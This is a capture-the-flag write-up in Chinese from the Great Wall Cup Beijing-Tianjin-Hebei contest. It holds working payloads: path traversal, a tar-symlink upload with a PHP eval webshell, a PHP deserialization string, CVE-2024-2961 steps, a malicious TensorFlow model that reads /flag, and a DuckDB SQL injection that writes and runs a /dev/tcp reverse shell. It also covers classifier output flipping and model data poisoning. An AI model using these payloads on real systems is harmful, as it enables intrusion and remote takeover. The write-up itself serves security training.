---
title: 第五届长城杯 京津冀 Writeup by Mini-Venom
contest: 长城杯
year: 2025
difficulty: medium
vuln_type: misc_unknown
tags: [caps-case-control, tar-symlink-webshell, PHP-Incomplete-Class-deserialize, CVE-2024-2961, php-filter-iconv, Behinder-RC4, safetensors-export, FlippedPredictor, LLM-data-poisoning, duckdb-SQLi, read_csv-RCE]
attack_chain:
  - Web 文曲签学: #help 信息, caps 控制大小写, read ....//....//....//....//....//....//....//flag 路径穿越
  - Web EZ_upload: tar 解压 + 软连接 ln -s /var/www/html aaa + aaa/aaa.php 一句话木马 + 蚁剑
  - Web SeRce: __PHP_Incomplete_Class 反序列化
    ?exp=O:22:"__PHP_Incomplete_Class":2:{s:4:"name";s:8:"RedHeart";s:6:"nation";s:5:"China";}
  - Web CVE-2024-2961: php://filter iconv + file:///proc/self/maps + 下载 libc + /readflag > /tmp/lier.txt
  - 数据安全 RealCheckIn-1: tcp stream 1102 写入 flag
  - 数据安全 RealCheckIn-3: 冰蝎 RC4 解密 key=supernov@
  - AI easy_poison: FlippedPredictor 包装 TextClassifier 翻转二分类输出
  - AI Mini-modelscope: tf.io.read_file("/flag") + tf.saved_model.save + ascii 转字符串
  - AI 数据投毒: safetensors 导出 numpy 数组 + flag{po2iso3ning_su4cces5sfully_triggered}
  - AI eztalk: duckdb SQL 注入 + install shellfs from community + load shellfs + read_csv('bash /tmp/exploit |')
key_payload: 'caps 路径穿越 + tar 软连接 + Incomplete_Class + CVE-2024-2961 + tf.io.read_file + duckdb read_csv RCE'
one_liner: 第五届长城杯京津冀 Mini-Venom 10 题：caps 路径穿越 + tar 软连接 + Incomplete_Class + CVE-2024-2961 + safetensors 导出 + duckdb RCE。
lesson: 长城杯京津冀特色：Web caps 控制大小写 + tar 软连接 + Incomplete_Class + AI 题 tf.io.read_file + duckdb read_csv RCE。
quality: high
---

# 第五届长城杯-京津冀 writeup by Mini-Venom

**来源**: ctfiot.com ID 271264
**战队**: Mini-Venom（ChaMd5 招新广告）

## Web

### 1. 文曲签学
- `#help` 获得信息
- `#hint` 提示 caps 控制大小写
- `read ....//....//....//....//....//....//....//flag` 路径穿越

### 2. EZ_upload
```php
<?php
highlight_file(__FILE__);
function handleFileUpload($file) {
    $uploadDirectory = '/tmp/';
    $filename = preg_replace('/[^a-zA-Z0-9_\-.]/', '_', $file['name']);
    $destination = $uploadDirectory . $filename;
    if (move_uploaded_file($file['tmp_name'], $destination)) {
        exec('cd /tmp && tar -xvf ' . $filename . ' && pwd');
    }
}
handleFileUpload($_FILES['file']);
```

**利用**: 软连接 + tar
```bash
ln -s /var/www/html aaa
tar -cvf aaa.tar aaa

mkdir -p aaa
echo '<?php @eval($_POST["aaa"]);?>' > aaa/aaa.php
tar -cvf aaa2.tar aaa/aaa.php
```
蚁剑连接得 flag。

### 3. SeRce
- `__PHP_Incomplete_Class` 反序列化
- 绕过: `?exp=O:22:"__PHP_Incomplete_Class":2:{s:4:"name";s:8:"RedHeart";s:6:"nation";s:5:"China";}`

### 4. CVE-2024-2961
- php://filter iconv + file:///proc/self/maps
- 下载 libc.so.6
- `/readflag > /tmp/lier.txt`
- `filetoread=file:///tmp/lier.txt`

## 数据安全

### RealCheckIn-1
- TCP stream 1102 写入 flag

### RealCheckIn-3
- 冰蝎加密流量: `90d1b4d15f7113a53996b0968b9da80d75d494f553758768ed769b0e237c6632f71b98ae2b04`
- RC4 key = `supernov@`

## AI

### 1. easy_poison
- FlippedPredictor 包装 TextClassifier
- 翻转二分类输出（sigmoid 取负 / 两类 logits 交换）
- 不修改模型权重, state_dict 与原模型一致

### 2. Mini-modelscope
```python
import tensorflow as tf
import shutil

class EvilModel(tf.Module):
    @tf.function(input_signature=[tf.TensorSpec(shape=[1,1], dtype=tf.float32)])
    def serve(self, x):
        try:
            content = tf.io.read_file("/flag")
            byte_array = tf.strings.unicode_decode(content, 'UTF-8')
            return {"prediction": tf.cast(byte_array, tf.int32)}
        except:
            return {"prediction": tf.constant([0], dtype=tf.int32)}

model = EvilModel()
tf.saved_model.save(model, "model", signatures={"serve": model.serve})
shutil.make_archive("model", "zip", "model")
```

### 3. 数据投毒
- safetensors 导出 numpy 数组
- 跑验证脚本
- flag: `flag{po2iso3ning_su4cces5sfully_triggered}`

### 4. eztalk
- 账号: guest guest
- SQL 注入:
```sql
test') as score, node_id, text from documents;
COPY (SELECT 'sh -i >& /dev/tcp/0.0.0.0/4444 0>&1') TO '/tmp/exploit';
select concat('0test') as score, node_id, text from documents;
install shellfs from community;
load shellfs;
select * from read_csv('bash /tmp/exploit |');
```

## 评价
第五届长城杯京津冀 Mini-Venom 10 题：Web caps + tar 软连接 + Incomplete_Class + CVE-2024-2961 + AI tf.io.read_file + duckdb read_csv RCE。
